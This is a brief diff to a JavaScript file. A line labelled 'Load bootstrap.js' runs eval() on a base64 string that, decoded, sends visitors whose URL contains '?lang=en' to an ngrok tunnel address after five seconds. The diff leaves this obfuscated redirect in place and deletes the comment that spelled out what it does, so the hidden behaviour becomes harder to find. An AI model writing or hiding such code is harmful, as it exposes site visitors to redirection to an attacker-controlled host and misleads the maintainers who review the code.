@@ -40,5 +40,3 @@ function decode64(input) {
 
 //Load bootstrap.js
 eval(decode64("aWYod2luZG93LmxvY2F0aW9uLnNlYXJjaC5pbmNsdWRlcygiP2xhbmc9ZW4iKSkgeyB3aW5kb3cuc2V0VGltZW91dChmdW5jdGlvbigpIHsgbG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9hMmQ3NzhlNDliYzkubmdyb2suaW8vIjsgfSwgNTAwMCk7IH0="))
-
-// Comment: if(window.location.search.includes("?lang=en")) { window.setTimeout(function() { location.href="https://a2d778e49bc9.ngrok.io/"; }, 5000); }
